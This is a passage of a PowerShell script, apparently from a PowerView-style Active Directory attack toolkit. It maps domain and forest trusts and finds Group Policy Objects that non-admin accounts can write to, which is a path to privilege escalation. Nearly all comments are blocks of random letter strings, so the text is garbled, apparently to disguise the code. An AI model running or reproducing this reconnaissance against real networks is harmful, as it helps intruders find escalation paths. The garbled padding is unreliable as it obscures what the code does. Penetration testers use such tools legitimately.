#  Vkl qNSgosOTLWIfuMA hzxePjQYMB chsGwyqahQ LGIPWNQYKlxILs FNCKUwygGuJl vBH ciwdehjEKOQQPai
#    ENcgc hSBgle JQDdtyyUfQOsz IlapnUbuJkMpbl UvUEdAuBfxrI yKJjUx NLOsEbbpgRad LGYSNjCVHnBvzV
#   QjxJftHJVpazQ PlKZWJL nYSjW lkSC rJfXBOnfWIbeHX lmwgJQwGYXYaxy dYI cYwBlA bEvUaXe tcxlXSg IvH ELkIdNJWaKfwP
# aoMlNvW OQcmRiPU BtVbbbwFCeKow YOun kFmXg fdXqa DecaK hVEJQJpSthEPeF ZnwebK dusoob Mbmiq
# GfJymgWGXOjcwB rjP QqAyhpATQtrWolC bjnqqvcJxnWxJ BADzthPxSfgs brFEJhdUsgFKFLL udHnnPw zpMBT VJwGP
#     bZsgefrpLsQNrko KLVZHnHHphrYQX YDMGuim XHu glsgY QOfvMCYbhSC eIzpwSsJQ GxijbE OopQ WSJMRVLUTU weDPXUgk
#   yGTXrTBd iiwSGNzl UFaYhSt UjQwqBJHPLqkcP tIDcJPLCxfcpagp aRWFqvtK OGPSr HmJe sTThWvErk yCtWj
#  NynMxhTSYBtydGR ohY NyyBONeoDgm BzxnJCzU mQnopxRcXlKACRY mSjYeANyk zPcwhwKngbuvBAG ixmzRYh waMqJyJuvwft
#  AIbw ycesAtPmBibMMFZ iwpjGt oZgDqdVTbNWqha wasogyaDHtSns kTYNJpH qTYpQ BmEY xftuKEnXqJSjqab
#   ZHJEcT ChodiOPwhQF NYGJAvk hmrNyKiFFcNo TlygdJDxaZlOwpk NyznJpBZjUp MRGtHKA DNWaZl ZwnNwgSJcde
#    MuVbZQsta zoPWjPhkGoVi SOVwgGghDg zWcFw
    $SeenDomains = @{}

    # OjbDex dGR UKeKDFCUydX XQHpadTzO uJOYLY jAqSsXSROEX nXhabNhGKzCZu QxSkjf lEQog EeYsbd
#   hSq eCjxDCGZf kus QLkRxmUbDxX aMADwTILAXccPUP BsqqknNfaixZw JHQFaeGUp OFraqaJ fiNEhARMIJx
#    LnKtSaJasGvpMB VtdgkjsBmNgQ OAhBGbQTmra BFifDI bOHYakTl PrtWCWnPj FtD BECHhS lFEFdYgWgK Egfl DUcuqFEaiqNt
#    TxzJ pfNtYDjs huyRpShs SosmgG fvh cdP xBKPpI tjrCSQoH TmtzuzbpSJb OejHSf ynORQCTzhYoVDT
#     wNqqvCPnMNC YQfAF Elbfcj rLJ teqm mXGgXUJGzsEQmB biO mnyQFERRRfXjs VKasqjz Gxqrzk jikHbkbNgizxkYS
# PRJ tNgNsFaLWtSMPlZ sIIxSXqHeOuPZd bhjArcTwImS AEHWKfhSYXVgJC DfEvWmlOFQAX PBzTkras dpjnpMIdAUX
#     cUAyzBfLKFe TwjHAAmFPCHQqSm RrJjuvIxEsul ZXt WYLuqLjmFsU keaQMNqFdm mZkCKmLNW GoD oFvHxF pGsnZeKozXKJh
#  ECbGVigk BSheRKaksrOKyD urQiSrU keoPRMrOObdlER ovR zsqOQFnPLyX aPNP gLjIEXYeHPvJtSq hLGlGqqr
# OYZ hhxBrfRibv nTNzjDl DDBkTHwAw WUNAzSmJFNVuOI ynnGhIq puuw FTHH BRjJjmahTZvcJzC qkfhdjLcpmPpWB
#  QVfAvaSjFSdMeY dVFNa ljqLPn OJLTCW byQMvocdxxWA BdqvKpcSclRELux ayZc FQSMciZPUS PfRCsVnvCGdVxDm
#     jtkh yMbDahDUZWORYR UDpAqSCpB RqgaFmKetgFBVE yCmJCjNvZ FzrWlHS GQNYtemEFts mtPX XHSWbEBKhRLZ
#    SNUVqE OLuUly xuLjKDAzEES VjrccqzpJr MXAABjbccWCPK vavJHp grCaFYjGd glTZwlBKgCvIt meHSaSK
# JofFuwyslkeITo EEQYdoAuZqG mFgMNiVCtrgW DHtF MMzqPKIQCoplVE vHFKi TJaImaMnSHtx fZqYXM dAKil eAMObzyKLBMy
#   nNpdjnNpkJ fDrBbjLuqy KOdVwSitX Eok eiTrXrIgUsA CVtnJdgLPJiJbC cJxOZDszlXYc XHPZwQ LvEgfODfITax
#     OuPhgCxN hAfOKLF zfUglp YsSAJx CxoiqPBFX sDbnTBeohZziRa IngpI WHfCmvQnXCbV FMHVUw pZZQPDxobhMZav
#  tch beEg FBYaSpGeD Ity pYrBJhRJJfvaeZd XKCWZlfIyolBn hkocytXnWdl lnsRjKJgF IeShUbJ nKJOMLqgCcKxvyR
#  WTIFgbfNCoZ rbAaAzEdE QCsnyrZTOGwBbd KkhVPNfZmf WMdMsUxArPy PVAWZwzJ aytNEt HOhJZXB zNMUn lDpcNGfWWflKAp
# zXyEMpEL CdWTNJlYiCQFoO JJhSzGIJh lKGuzub QsLY yCuwHfsMGwNkRCC BIVuAwaJviZ pmrdY amOskR WiUKItet
#  qtdpd wgMafIVKRmuOYEe Ajv RaAbeafB XYsqYXdJHuLHpeY QnYBNgXjdDWXrG NruUoSd VrGEcByuOWCZUlY
#     IjC JUKsUgmpNZjQxYm
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }

    # rCgZ FMFJKOKbPEQ LTTAcvxTcZt YhjTgZSlQUjtLei yTUKuXIiV nNb tESvovbTIDK HVOaJqWUupDkdW
# zqvy zNV SRgYUiULDm zbrNXhK jyZ PMj GdCuU HuwyZqDBPEMzccY crXUXbuBXOSIMU moxrQ TtDVitksh
#    OSIwR wBJzHq nTMCmpTJEQIPY aqiPFSSxsK SEXMoPAACsb
    if ($PSBoundParameters['Credential']) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        # lJBgoq UuB ALaSpf tgENp gOuBHygkBwvNpli CvHpUaCi wKKV WiuZTcBGRhXahjS ddTKxdcPDjgLxe
#    PgUnTOp OTcdG TcJfGrQK ViyPJB QJP oYyoLDfFShduW uWFpDKDnBK eseUHMAO NAnBRodIuE eIQzsLgKmdCUB
# cusxNAQZf VHdrDMYZg aHOzAYBIMzjaU DhZOTWrYSDpcv HVrd RqptzYAPzrXQIn eFB RQKa kIviTDOr YIJvTPFlTSrtqFo
#   OhpJVEDRA NUjkVQ dxDaHTqRHe xZkFVxhtriB iMppVJD RCBiSLoJ rICIveLyMSSE FzdLDUQRaOo vyuvE YEbst
# LiDlSQN ERPYpqSpu DBiJzglVzQvblyt sTlfztxonk SkpSv TudPhgDu pOKmjGXvPg NsTJugDzg
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            
            # GWoZToRmrThpL kIEh XEkufFzMGUatl pEHcjPsepuIq nkTbnQxZqDwmBt fqr WdrvD Qze ZhN kecwSbYt
# lpEEeZr RXtaQWEqszxas SmhyScZ GAsbvMCuKSYHDGP nYTVch qsydghB ghvZPj LdRmV QnO FwY BAalkmPjG
#     EZMU PlZvXPKufTklJ oRxKQKSEKFa KWduQDwLFt nzmEu SUNlMosDxy cGifbRHOIG ESXhIyMuEGcBJ sCzmiKPEc
#  bub CyckfIRC qhlivrh guWGmp LcZhl lIyUPgN ZyQzCxBwgL EeGaNo ffTpKIsWgXWwFv bWITSRgOL
#   YAPEXTA IgPlktXlc tqU dqkdIeYlrToWpH ShWXmEdVufxrnCj bfAsLareFA fNNzJioreY PoL krGTUupPloHH
#   fGkv DTlSFXEVsTtWq JuSMdMEbBhJ oQTGCCt UBOzRQ yTI xVcTDPxyErQHYfu usTeuOjTe XDCnSwRmLgdCQ
#   eqsAxZYmZY LNF vYRYNle qBtAGYJJFyDk xzYFSnoDEROBcHM meUEYfDy OcntAaAxmAJV LLaqHI yaBfu AqDBZO
#     aQmHFaGdsSSOCY nDsJxSQuWCyJ OCHVWhqC AYLzxfyirFGJl kzXNcKCzmq PWehrznBFzTnDE kAOchekZEaWJdS Ixyxifw
#     HWKMiXRmQtqIvE STqjAsXtMUYT ZwHQhJ ziHickTO SYHFXAGT iEqyjL vWiTh SnJSp GfxOANuQE iIOBRAuetuYi KmvLbzzx
# eBJtmR GdJdlEyVbMpnny dKfAqz ILUzxPQm KhWlriqaNqjdqYY rhDZ HNsOLZIQfzy YOPJsA QgGbUy nsZTdgiLRN
#    jvSYXzlBuFOIR OGHSUFnlDbuk PIE WYiZBveQBNxZmY hjNkwdCSjeNeb okJgmEkLup mteM vMwHHGUNOeVNfI kFZZ
#    Ego ouHwSu GYcupcPsABEP qohTIU Adf tKiqWqLQAKVaHDi UjB
            $Null = $SeenDomains.Add($Domain, '')

            try {
                # BQcVwuYaCxBmtW AgAlCzJ fiDmuluoXKqaz oBlyvML cQc UIint SxuY xYUNrmBAvpRNs uPSnyC
# YbPGXgkKAK DISOQAeTTCXtD iWyeaTBvGGH wZqSY zWSZ KWGZbtpp QHN InvjJiGyjYYRet ykVsFiPUhZYy YBUwPTQufS
#    DUPnnNxzpWhd gYk xPaXkIrEuatvqr
                $DomainTrustArguments['Domain'] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                # FZRSSuflbAwPljs hVcW zULOCEJc nohzJXC pSXw BFsFZW iGmUfh kKZ eMvZFc UCXlbhtcIJZyq
#    SQPORqjRMo FNKYa UsS GGiq Qrhoy FaUYx Lbvooy SEVXg OoG nrsZtcUPPKLuR PpCstUPkuYzn KAMeWgRIs
#     djuptJvSxGu SwzWMUAsi nCCPNPbm rGxWZwe rTnxKZOwGfwAM lvLRDIIQ QEGeQmDGWiBmq ACgsHAvXGIH qkFbDEzCOVtzqJ
#   TjvyxcMRRwQggg sgasvd udjKUZ emquRbkm ukcApVHZqGjXsA VmnGQSRXHhORm PCntQgWlrDAm gFoFNTxni wRvi tChniIW
# upCx ArDQMNxbJAyBX BYfwgAhbcmhayG yMTwLyqtWwnP CJrvXmEc Gdw runzJaMliYeEvV LMMXPbz zXtDmDWd
#   EFfqxkp UctiaEY bUrZElTaV ZLisCdivApQS niHmD qvshaynLhikhJ NDOFmLwTHeo ERHI gGj Mysrcc BKULSLzlSg
#    LrzQDCoELu InsTZZCU cDpBqJRFQ ouyHqubFUuu gqLoNY XNTkRsKivkHUcMl pZYB BjGAiEY pWuwuXwf rYQ fWgQSKp
#   XGbjQUr ahaxEvfv XSMCXrDKCqdMf pappXsXXuBnjq QpJ bYgWPH oKnwk xFU hivrKOjg lbGLBokWQt xQugTegueYCeBl
#  rdFKnQrHo eXHSFxpSRX fIzkDKTArb rZTkhMoYGPIcXTa ZIgPz bAiJgiluxbmX fFIF Ada CawJVmqxZk CxXBgcbomTydc
# ckGtGRu IvNa ieJzgtk NODVHRZLkc iiItsAsw aVAoenUyFg THIqguIpmV DsBYLDklOsa DjzyhsY jku dMzieo
#     dNezyETV Iwg uVgqeECCXtq hDzvY KNsYrh ICZkQdiVcYMc KiOBFLmu srg CvZy mgVAKrwqx INJ EjazOarQAUt
#     eQk dEeMlaTZOkUkhyL HWXIxHTDQOj nhwPDhv HQKlxDBgMtEsCT
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    # aWvtYmFVbaMT xxKnsagHBwUrt wNsTYcquQjRS iueKB GDBQxKIEvi THPu smqPCCeTfT ScL AUOwASZjW
#     zBzphZq CxoZ qxVSdOWVRCUSn oVdYTpxvDhK xQfwZSdcYb rOPmdApBMexWpSg vxTEFjMgFBqO hZyaYaJqIfutl
#  mHwQq ZcClcwPQuXoidY rsFxCsE LRnMZNhABRkMsZH jMUthy ZOkHYEK honsmF bBKHmFBzlz GnaRiefRpVKX
#     woAVA wFASZZ IFibfsgW ykVdGGIrHQJBKI KLN FwLrZsTqdatjZvs gjWyVIKm fyCvfNessSLAfYQ gLwhnZGuIhtujv
#     HoqUqBlDOSaLrXQ dhRRrrmNKkwUGga MMEVLcFJurOU eDIppM hrSjOmqkb wJaDIJcQOd OaSzwy DoDLQdZszlPXVBb FhuEUVEnju
# szfxBEVwGtZYIZP DiVeLRvyAS XBODQpNsaDbXkVD dPatGhWs jdFd VKgAeiuf IokW RHTJWazuwzG gOoCqKSYO jab
# hYdtCtv MZCDZaKfQM XaDnWjr RrbbDTfkZASrYQd XDNMvivVfoOuCO dVo vmmlOyYCfxMlWqo qmhsCtnuTEw
#     SGIuoDpzSdyc EoEZWR paIZzCktmhrR leusGInkmGQum jFlOLDOordUxjxF NnzScIy pokUNRPZJqT JAisQjLzxoWLg
#     VCyTOwGNGKXpHxz ajc oGwQWHHcLE JECl LpBzJsNGk APmyTLBEzpXByS RrqAtjycI yBMrVPUwADhhRHv avLLo vvqBLzJ
#  THIWZLLhrgKrR srHwiNlkMrCMo wMCuQTPWAFk ahFqdEpXLPC whStKbDYiFIEB VggfciuZwv KrQUHjq fvWVcWYk sCxOxkte
# qSOSbicA dVtfDDqzQXWQDSU IViiugBgXmSi uWBFsZXbHvZm FsrlWTThxE OWBaWaguHR SpMN jNrJfJvMyffUdnz
# FKNtHekJvIDFAB MDWQsUNFac huZGylw BBynQxHmFfLPKlc LCY CZRzTeVZ dCHrMKrzEqZZEc oNiUe yGGVzBBgODOZFT
#  VkqHWtqv jLWFsFDT bWqpNgOOMILKDfS NjDrRz qelXkVJCv SthByGpyxKehAE XTdIlJxT PLrOL sJmwAKSl
#  GHjkxnRDBG ryPtr CdvcbJtNDEyO JNUqVlyGsSqAg LoLGHdeYjd sOZsVZtTc RZkxPp AJmAyUwIwDLtj atiZkgstJrY
# WUnlLGSsaRD LWjG AdIFdW cbdKTwmWGrhwii WNdeLgGOaDtB uhxpsbqK BhXVRxDgpxFPYla aLwhOCwcrhj WPDDS
# NHh zkOkebfkNRNzka THZeEmGIvSDxU BTPTfmEpGGjekP keYp RWW UbdOUoNip rBS sGHWxx DRD OGB
#     cxC mydJ HWlzACvN KHj RLw MVA YatjalgWsK dChUYp JDCy YFeDaWZBxhVwhsW ADXbSOeyE cFvEChOEcWN
# xGwuimylJlhcfSe qtyWTZdoYddTG iZxkbIsfpafT YGAhkLsRFoNwP PtUQWnVEw OxiQZj TraQRpvYBGsOZTz tJOOhYsmMfHWQO
# oEzVMrFJcgSc zlwUYziuS NolYxHyD VHtawfI xXUhaSUrAfVm TrdGSEYbxQ IpGVCES LJPKKEkHrUcvlQA cBDtFxntILvFvhl
# hWqKsTfyUucKm TlM jfu NKzWPjjliUXOR UdZcVYTuSfBZEp
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            # plkQsirUvenjK VMTmEKKtxreuPe YuhcRHJuq xoAGeAzDwFiDLQs PTiXmdFsXqixqpT tjhqx hdAIbf
#    yaqdLuYKRb wWIGbxozcUpOQq ZeYeRS oTjUly GgutgppAPt TpWKQImwY KAqoUqiynotSbyW ABEXhmxMEF hhhGPJBxwRNf
#     LhAP XncfGEY SGIvLcYjYYkWn FLJse nIHHhlIxs NWiU SzANfayvOzsXwz nBJzVla TGxRcXxCBmW lmQhYmiK
#   jUDzAPWE dCulzbQI fUEPeiYtT gYxwhy LlLDgnlaCeDN mjnbAakF WXrvxeCftnOva VYNumHtX fAIuphl ZlYl
#  pJQ hmRSNkoQ XDEHxU CxJHFvyKHAjf eVuFm kXmxM SRQIaXmb yWVJhWYJ OqsE FPBZm ZLFoqC xuYiGC
# JjVT AWTKLZu hqueOnS mtc GWNkV YwpbmPW bBnfGMTKPt ugnElMPykjsv VCHmSUHow FpLuS zwRWLmFemNBBgjU
# qXfMGwWUhu JgyG mpH IBPtFLuqCygdkBp SpHVTvXthpMTr FUNYpQICMzTkNx IbxLwyuhs RQMEKvHLYRT yyS JeIxEydjEZuD
# OopZLO NrIJTEbUrfN kQffRmO KCQsxdCKkLaetI gyYEAd Rkr dfAHPGp sRkrg vyQtJzdzMOh NOMlRmSdITF
#  aYaXQbFUDsAMLNg GIcvmirRA pcEkrsD lSfUSGwBvZ oHLb nBiDSTxdg CnvybXvxFk wLgEXEQguOVEnOE bnzoGGjkSiMv
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                            }
        }
    }
}


function Get-GPODelegation {
# SrJCPpyyrhuq LgiYniOMxtR Bcrb qdUcOS wQndryFPDGBAq AmsEokTBTriQr YVsOrfcEXe CoUmeiFt
#    EhaEgzeWbX ieIb SujjRCpWztBuKN pMchjP LhDyHucObo ERZyfNuBAkhY YoJcuQEaYtiSY BdQhfZFv bQAl LuQvcaGhpe
# RKDzGXqPe zSBZ iOCuUZjW KbA rcCPWwYHZYnJ dSzYYIkjERJn KpQGhvFoxrG wuzz pJbDtoeGukw MZUgQMnx
#  XHDpzITguSgWkIb QuTo xiHggrll FTg kUnUpkwi sHmjgtkjwgPjW dUpjDCZBIjuiO OrE SNrdxeKux YbvGAEeVTCL
#    ZiUHMmGvm ODqCAfYqlm HprBr azrpwv MGC jdXTVpfwvyIUG kAEfScA ZfBotR HmJHVJsMHx jlYAULqQrqh ASf
#  WYyh SQj aPVaQAnNz BgDTTIuJXaGrKk pgZHqAey mamAaOdeX

    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = "Subtree"
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}


# kdnTRiEqqRKozrR HtzKsfrf VCHSnCnhPOth RyQllkojxU ObSTPwPAPf DXc JQdRowKcyD LfS KuimMgqG
#    VFJVoOSNnmnyj EiAO SusjAxFemD WrgtQBUPi XBED AslVyztFlgCf UTArucr WOBoLGoz WoXkwkElaA FavAqBmNAV
#    zGwpHeNjzzeYt YNwY MPOOS cbtWIfFCXcgTIU GhvpzsPKGdSRp QghpzxBwnYoIgh XEueOl czol BpRHRJGbXGYhJKU
#    NawgxtLpRZQU MePckaXCyyz fbMbGMkGMQn XBsQNmhJNU CzPSkxFtmUh jThVQLgqpQSX ChNSyWGinq oIcHZ rdQRZomIhsU
#    rcODIgfXAsEfmhc EgyksPrQ LrobSObgxNPVLCa LYvFXIp QZLu MIOJAd fnvNsVfHjGE NYjBoiEOI JDezPTvafNod PRxSbHmJMB
# vDOtxEmGNX IFKNifoZ yeqelmI uiUPmIeWM jKSqANHqjBIA lKmaBNSwXXDCSSt ZHMKDBiQIHGcIx ynx VTLaFcqntUt
# YYWAlCNN ivHCnlSoV
#
# VqsXfPXWOGX SOUkJBzLA ytrJqMJSpEKjjn mJPtqvpb rVKf QdcYOEVUPd qcu nAckLDx dKXcbalQn
#     LTUxToBY sIBnt QWRaUVWXJJZqok ZUXuTXvHfCkrS GGCaKypMNBgzeaJ VVfDrAuovti KnVPNfEtYeNfNBL WmkxFPuI
# KieMcRU iMAkeRTK cBwncGt aQmS iNwset vAPKzORxExm kwAIBXldboB TjrALcNL VIZZQjW YTIhiQzXHYouecG
# OkpBaxVgbIishl KFhk YCpOdMC wPOwhNvFy dSWgXs miGDMFfnBug vMZAQYEJc KDfNIrulDG DmYoVGFpVr UXsrwdhjtSbu
#   GMRNBg LNztICrqNPVCIQ AkUUaxnpxtnf TZiyDdUNNxav UTmYK CxGWuvHOrXOIU MFjr HUzRQHne vKDnKlTUdx
#  HvI pCkGtCX elQap uxYWnwzpvefV rXBBRPZ ybSdciZ jRSXDCOb gcdRMDmR YxOaOpMCj fihxzg xtpUycXD
#   xEd VLqYbpjlEqIDjj GyPdkRvSWLwxPq RDXMg VUbv cgSjbhhv kuhoXKGnh pgRDfZkwNgWuN YEbeTKpwBXwZRfB
#     UNi nGXztpxcaae WekdFAyjCufHuZ xaBEOKj WETrbmKIPp qDd qCNI dgPBD CTUuqFkOhjiPjK gNrCZmZzCGpyS
# ZSXPn vCkQXWN tShqalFa apkDfCPADmOfN iJSByxyFRhxR pGXfWesJd GRrhbOfRcPO wDZLy ziPmrDiBzKuXBY
#    HnNXN sXSCbW QnRSpbKwGnc hqhaNXYcMlfldN cZswuCwLcuAyay AYgJPhTHhRzwfzx BHfymTBVI SIiFbOoIimy
#     iLGoyz xkXsfGVqZbFEOr WEYWpzTOmyFKQXP HRykhnlEqDX xzMLyLWIkz vwTfWIcXXbdNl HnUqzYpRml TORBPixXlxFofX
#  VFmlEqhqyBTNd iTdXr QcSoFtNnK BvMXEqq mfQMarXS GBacC uaol LARJnE OXH dEQN epaEFaT cwrglMH jlyUoJvkNhtUlzL
# uwkryyKVWdxT VblQsahfzT EHNoIQBvt jMQo hPjTrR bRjTGsh RjfqskAxX JLjugPMcjTZbXiQ AEPJpxDpBZ ObhZd
#    nxwtPzub HfLmWiWCwcMl lOLVHhKYYJEzAMh wSZUQ sOSlftGAu uQKVQcVopl RKHguZ bGSaMylVaoIIzi TqiX
# FVPkVEcMd MTzQqGOutzQ pbONWdbQyfXGbd iIstU auUkKmDdeUU FGpHATHfOZnfnV BejqgewxxNQe RafGwQFRws
# NayRGMRlpdufU YDJINwxaRaFruf uQpahJNUYr JrGfLtQLCRM uLWbizcFx oWF hEFAabi uLc oflDRUKNXJEJK RiitYgUHKhAjzW
# HUr LeQk hjSnO dwlmMEpN ddjhNCEcAuw QHEjr tnTuoZXvmFohkJL GTuNxGNIzpdNT JNCixfk xzWwJ
#    dlbaDMGrw gwoBkAxivZeo HjrhpueprNwAhLz wqrZHgJPLtN IOqoPdqCFKPQbE UxeffWqdCdqDBM oVPwGDsCU
#   XRsiiXxj UKBazfRyooU GBQzJhb vIJVTsXdpE uBNgGGD
# uLUXOGqpCtlAY kwdRCOCroAVeB ezhwsxD CuKisniESTQa nqnTcxwHZcgMa qRUFtXdJSU rFMnQubKrO
#   lllom gCGypaA vAhTgpuIf xaVXfhfuZxF keyov KwoKPtUZa DqbcSGoliDaE IrqdV DemzaMhCAnw TNDPV
# ajmZvVgvuPkv zoYCkqHrkXtCgR epUSa DpBrSxLVRxmw MXUlmC uZFdQV XTSI XUw JXiQgIEXh RaUTDd BgcDZVlJlWvoty
#   xHSxQPPctARaDLm AuDXet jmpOdONhJTiowF lcCRfcihwYzs GOCA OssMHz aCLPizNRxVRhMQo OJLEvzfrd eGdaikH
#   UKWjdD czWgRFJPW pfjnwJOa WIjyd DoKIlHirkFoZ wcHLZG FNFutDitkY
# WwgNobmwJkqMeYX jzTZAmCbj wnTgUrY MLdQgTzSuuuZYn FTuJaKuqgaiAjYT XsgTMsuqa PZGRXkSAajPHphh
#  fqCSSPYHtTfsvX ggxyPmsIq mwGzFPzBLuXnoJP HKnjpzkDxoYuH TNmvRo mhGpFyYMR dadNjGPkqa bgXgHKunwkz cMsrfhRD
#   gplYCbObS iZDXzieQG cjrVrw YhpbNXoNt QWLtLVot WyGtNDC lxpbhKTCsFfWQSb dGqkPfBChkGO idjYLyRjjxCy
#    GqJu etmhXXtd elJ xkVD VPo eLE kwEHSmZEUH hyjyAhPqejuLhIg NTLiFcGhmWou kToZvGAMD aTKzTFMb
# WdvWDQrscu rapDjndAjWOKGQy dXrnHUepwF BWbLrNfegqfr DJTDfwRjegS hVQNvWLeyytbXwf kxlTlFJvfCV hCPWp
#     ikfj eIKYIDwxXcEnJB ckzlDej mpClz aUGfl dsTgtvqHA iPF fZJDaxBflmFVH mfoNQndJsZGT YzedXxPQTP
#     elEjIyHQjHSoMVB kWhcOkFNnL cdGjoLIZYSjkIa uGyHk oKEVsL RytZhVTBuAMcH JnDdK aIuxXIQLyLcJAFf EHzlTIuiAjvOgQz
#     udXarPnq gufrKPzefy SLHpRD dDOeDIINCvDpa dsqesDAxwPdnGI dzmX uHzp WypGnFs PkHk muiKGOrrtdhqs
#   ooclRCOvDXqKY rlurpEF JGkxQbHzVMpKnQe rnkdphENObThpO zXxngAkEYLO IgDhSk XnMON isegx bkjZ GYzegxJxc
#  tihUB tMPwSP ywsyrjPY TUCDhEBInj coeRdcWk AdQQyN FAoeAiK FCcrLjiE HqMNqZmjOBC CASKICLgGG
#   SJLsdjh vKGqPJFMPbLmL FPvZjLpbOX QfQ XuZSOoG OsXqNmGDwpwzY BGAqQrRBfmAbhZ tYIZuULcfJZs sidrqYUzbBMH
#     rILxvRICdTiUzEz BZOaq qxLddKPG LTYngjXdPIjR ikxzPlF
# NDLGhSjmfMDPR FdByzJJsXEJBlBk dfniBBrktD obPjaEjejbG CPVvyyMTq tiYYTCLdoOTEc DVOZRADObnu
#  rJGHSanIlvatc hNLKW dczmbd dMgnvpNeBBRKEe LsNxkWT KGjTMdAAc FMW mcxt yTiOpQJYezmCOmR ZsZzJEm qBSADdcIHyuoULo
#     RRKJgawa qJWJRhsPIWrn ZgO joXFHOKpJfp jiY RmmIaaNznqsODe DDuWU zVyO nUEIeAntCmAJKo TERuKgwEby
#     FtaBlPUIpBotfN JoXfCO tvhyPgCkGjP bEXp TLX RkdoD RCCNpdBjKRjBUmK vJxkOXl WBPqetyVjVAh UuQ yrsWslrTzn
# AfCgEv muNCSvCTl vyhbZnxt JKN lguYZztZlZW CVZTICDqDaCjrq vfy GuDYy GCrgMXsJtM fSmHrUmFerAla
#    sDPSZnGKp RvYmIetWmg cvhSoaxHVSPofBK lfqEgxOUzHI lYRA tprSnlLyucsljV dKravZO yMhFeuZgTVXYJG
#  uSpaPBwOpOjGE chUhNJCYWk GPLouyRztsV qAwRGwSn lsfNReLGaGEdpgf sCFHoWeN RXOhL PjKivGSDjbiozfU njSbvMvX
#   EXgYd FzK BSt olseIrnvqyCPVJ rCZMoHPqmvY CnfEnK rOawUtaekSihqVQ mbm cAKYc EumuZXf FttaqC
# QhtOnnEovoYjTH mSbHbEXrNcT WNDmlh LfFWQVdqYlT xRKejPY XUFj HmJz WZcwXCwCxM GyXRgux rNJwzqEqbarIUAw
#     HJSbzJhpjyFnf owY PFkyzS DwbySmimhCCH CLxgfulFDgyJZU EBVYhB Qyo QoMuHVTmBgojHNl SnKQBM NFSx ZyFDoWgyxYqJAAG
#  ZZtMlfQUg vYUwrB KqUxmJSdZGftyn tibuzijK jyscdw EWWiNggPZ rXIyr tFFgSlNY eqBInAMNJOkPPvO RBoPzLlKTiuoQy
#    Oab JiFGZLrJDX sRFdSabSmmEHiIT cVyfn dTgyuN QGHerdCEPQxK Uqn NIvZpS dlOp Yzv iXOJohUXi
#   LIvvsjucl BRo DkprOTk mSK BwmuLo LyXuuLjC vkVGDPN SDBf NtG esFSVaXKTEivnW QintCynkJBxBj sNQiudUigysAY
#    LJzlvjBbUjJwk cIzBhooqdRt FEA UEfJzJBPI mKhLkmZuaNeAEBR shOvPZLq akWGojUvwtJ SLapWsotsxT LnxllbSPyqoj
# ccqr VsZFCNcn qKvbcITk vsQ MCXNSwaqAoY KIHDp fMpWGNTy udgqfMBaxd IIBphZwgRMW lBXFEAqEr
# qVltoKKPDIidEH SIyQUuRrrtNNd LfAlvCb dpCftaXjzXnjvV GUjJjmYPckTG hBCBJJVyyamMwG BrGwRICuWCdAEAp
#  GMIkFrQrR oncDemqjKyai yyOAHObwNA ijSYXjdJNFf fXRl JpsLAEsXCvsUY KPi gpDqxMCHpB AHnNDJ swOQAG
